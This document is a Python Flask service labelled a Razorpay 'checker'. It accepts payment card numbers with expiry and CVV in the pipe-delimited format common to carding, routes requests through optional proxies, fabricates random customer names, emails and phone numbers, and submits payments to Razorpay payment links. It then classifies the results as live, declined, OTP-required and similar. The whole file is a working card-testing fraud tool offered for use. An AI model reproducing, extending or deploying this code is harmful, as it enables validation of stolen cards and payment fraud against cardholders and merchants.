import asyncio
import aiohttp
import json
import re
import random
import os
import hashlib
from urllib.parse import urlparse
from flask import Flask, request, jsonify
from datetime import datetime

app = Flask(__name__)

# ================================================================
#  RAZORPAY DIRECT API CHECKER — NO SCRAPING
#  Uses Razorpay's public payment link API
# ================================================================

def parse_cc_string(cc_string):
    parts = cc_string.split('|')
    if len(parts) != 4:
        raise ValueError("Invalid CC format. Use: CC|MM|YYYY|CVV")
    return {
        'cc': parts[0].strip(),
        'mes': parts[1].strip(),
        'ano': parts[2].strip(),
        'cvv': parts[3].strip()
    }

def extract_clean_response(message):
    if not message:
        return "UNKNOWN_ERROR"
    message = str(message)
    patterns = [
        r'(captured|authorized|failed|refunded|pending|created|success)',
        r'(declined|invalid|insufficient|incorrect)',
        r'(E\d{3})',
        r'code["\']?\s*[:=]\s*["\']?([^"\',]+)["\']?',
    ]
    for pattern in patterns:
        match = re.search(pattern, message.lower(), re.IGNORECASE)
        if match:
            return match.group(1).upper()
    return message[:50]

def parse_proxy(proxy_str):
    if not proxy_str:
        return None
    parts = proxy_str.split(':')
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    elif len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return None

def get_payment_link_id_from_url(url):
    """Extract the payment link ID/handle from a razorpay.me URL."""
    # Handle: https://razorpay.me/@silverlining
    pattern = r'razorpay\.me/@([a-zA-Z0-9_\-]+)'
    match = re.search(pattern, url)
    if match:
        return match.group(1)
    
    # Also handle full link IDs
    pattern2 = r'razorpay\.me/([a-zA-Z0-9_\-]+)'
    match2 = re.search(pattern2, url)
    if match2:
        return match2.group(1)
    
    return None

async def resolve_payment_link(session, link_handle, proxy=None):
    """
    Resolve a razorpay.me/@handle to get payment link details.
    Uses Razorpay's public API.
    """
    try:
        # Razorpay's public API for payment links
        api_url = f"https://api.razorpay.com/v1/payment_links/{link_handle}"
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json',
            'Content-Type': 'application/json',
        }
        
        async with session.get(api_url, headers=headers, proxy=proxy) as resp:
            if resp.status == 200:
                data = await resp.json()
                return data
        
        # Fallback: try to get from the page (some handles redirect)
        fallback_url = f"https://razorpay.me/@{link_handle}"
        async with session.get(fallback_url, headers=headers, proxy=proxy, allow_redirects=True) as resp:
            html = await resp.text()
            # Look for order_id in the page source (sometimes embedded)
            order_match = re.search(r'order_id["\']?\s*[:=]\s*["\']([a-zA-Z0-9_]+)["\']', html)
            if order_match:
                return {'id': link_handle, 'order_id': order_match.group(1)}
            
            # Look for key_id
            key_match = re.search(r'key_id["\']?\s*[:=]\s*["\']([a-zA-Z0-9]+)["\']', html)
            if key_match:
                return {'id': link_handle, 'key_id': key_match.group(1)}
        
        return None
    except Exception:
        return None

async def create_payment_on_link(session, link_handle, card_data, proxy=None):
    """
    Create a payment directly on a Razorpay payment link.
    Uses the /payment_links/{link_id}/payments endpoint.
    """
    try:
        # The endpoint for making a payment on a link
        api_url = f"https://api.razorpay.com/v1/payment_links/{link_handle}/payments"
        
        # Generate random customer details
        first_names = ["Raj", "Priya", "Amit", "Sneha", "Vikram", "Ananya", "Arjun", "Meera"]
        last_names = ["Sharma", "Verma", "Patel", "Kumar", "Singh", "Reddy", "Joshi", "Gupta"]
        firstname = random.choice(first_names)
        lastname = random.choice(last_names)
        email = f"{firstname.lower()}.{lastname.lower()}{random.randint(100, 999)}@gmail.com"
        phone = f"9876543{random.randint(100, 999)}"
        
        # Build payment payload
        payload = {
            "payment_method": "card",
            "card": {
                "number": card_data['cc'],
                "expiry_month": card_data['mes'],
                "expiry_year": card_data['ano'],
                "cvv": card_data['cvv']
            },
            "customer": {
                "name": f"{firstname} {lastname}",
                "email": email,
                "contact": phone
            },
            "description": f"Payment via checker {datetime.now().strftime('%Y%m%d%H%M%S')}"
        }
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'Origin': 'https://razorpay.me',
            'Referer': 'https://razorpay.me/',
        }
        
        async with session.post(api_url, json=payload, headers=headers, proxy=proxy) as resp:
            raw_text = await resp.text()
            status = resp.status
            
            # Try to parse JSON
            try:
                data = json.loads(raw_text)
            except json.JSONDecodeError:
                data = {'raw': raw_text[:200], 'status': status}
            
            return data, status
            
    except Exception as e:
        return {'error': str(e)}, 500

async def check_card_razorpay_direct(cc, mes, ano, cvv, site_url, proxy_str=None):
    """
    Check card against Razorpay payment link directly.
    """
    gateway = "RAZORPAY"
    price = "0.00"
    currency = "INR"
    
    # Extract the payment link handle
    link_handle = get_payment_link_id_from_url(site_url)
    if not link_handle:
        return False, 'INVALID_LINK', gateway, price, currency
    
    proxy = parse_proxy(proxy_str) if proxy_str else None
    connector = aiohttp.TCPConnector(ssl=False)
    timeout = aiohttp.ClientTimeout(total=60)
    
    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            card_data = {
                'cc': cc,
                'mes': mes,
                'ano': ano,
                'cvv': cvv
            }
            
            # Try to create payment on the link
            result_data, status_code = await create_payment_on_link(
                session, link_handle, card_data, proxy
            )
            
            # Analyze the response
            if status_code == 200:
                # Payment attempt succeeded (or returned a result)
                status = result_data.get('status', '')
                error = result_data.get('error', result_data.get('message', ''))
                
                status_lower = str(status).lower()
                
                # Check for payment status
                if status_lower in ['captured', 'authorized', 'success']:
                    price = result_data.get('amount', '0.00')
                    return True, 'PAYMENT_SUCCESS', gateway, str(price), currency
                
                elif status_lower in ['pending', 'created']:
                    return True, 'PENDING', gateway, price, currency
                
                elif 'declined' in str(error).lower() or status_lower == 'failed':
                    return True, 'CARD_DECLINED', gateway, price, currency
                
                elif 'otp' in str(error).lower() or '3ds' in str(error).lower():
                    return True, 'OTP_REQUIRED', gateway, price, currency
                
                else:
                    clean = extract_clean_response(str(result_data))
                    if clean and clean not in ['UNKNOWN_ERROR']:
                        return True, clean, gateway, price, currency
                    return False, str(result_data)[:100], gateway, price, currency
            
            elif status_code == 400:
                # Bad request - check error message
                error_msg = result_data.get('error', result_data.get('message', str(result_data)))
                error_lower = str(error_msg).lower()
                
                if 'invalid card' in error_lower or 'incorrect' in error_lower:
                    return True, 'INVALID_CARD', gateway, price, currency
                elif 'insufficient' in error_lower:
                    return True, 'INSUFFICIENT_FUNDS', gateway, price, currency
                elif 'declined' in error_lower:
                    return True, 'CARD_DECLINED', gateway, price, currency
                else:
                    return False, error_msg[:100], gateway, price, currency
            
            elif status_code == 404:
                return False, 'LINK_NOT_FOUND', gateway, price, currency
            
            else:
                return False, f'HTTP_{status_code}', gateway, price, currency
                
    except asyncio.TimeoutError:
        return False, 'TIMEOUT', gateway, price, currency
    except Exception as e:
        return False, f'ERROR: {str(e)[:50]}', gateway, price, currency

# ================================================================
#  FLASK API
# ================================================================
@app.route('/razorpay', methods=['GET'])
def razorpay_checker():
    """Razorpay Direct API Checker."""
    try:
        site = request.args.get('site')
        cc_string = request.args.get('cc')
        proxy_str = request.args.get('proxy')
        
        if not site:
            return jsonify({"error": "Missing 'site'", "status": False}), 400
        if not cc_string:
            return jsonify({"error": "Missing 'cc'", "status": False}), 400
        
        try:
            cc_parts = parse_cc_string(cc_string)
        except ValueError as e:
            return jsonify({"error": str(e), "status": False}), 400
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        try:
            success, message, gateway, price, currency = loop.run_until_complete(
                check_card_razorpay_direct(
                    cc_parts['cc'], cc_parts['mes'], cc_parts['ano'], cc_parts['cvv'],
                    site, proxy_str
                )
            )
        finally:
            loop.close()
        
        return jsonify({
            "Gateway": gateway,
            "Price": float(price) if price.replace('.', '', 1).isdigit() else 0.0,
            "Response": extract_clean_response(message),
            "Status": success,
            "cc": cc_string
        })
        
    except Exception as e:
        return jsonify({
            "error": str(e),
            "status": False,
            "Gateway": "RAZORPAY",
            "Price": 0.0,
            "Response": f"ERROR: {str(e)}",
            "cc": request.args.get('cc', '')
        }), 500

@app.route('/razorpay/health', methods=['GET'])
def health():
    return jsonify({
        "status": "healthy",
        "service": "Razorpay Direct Checker",
        "version": "2.0"
    })

if __name__ == "__main__":
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)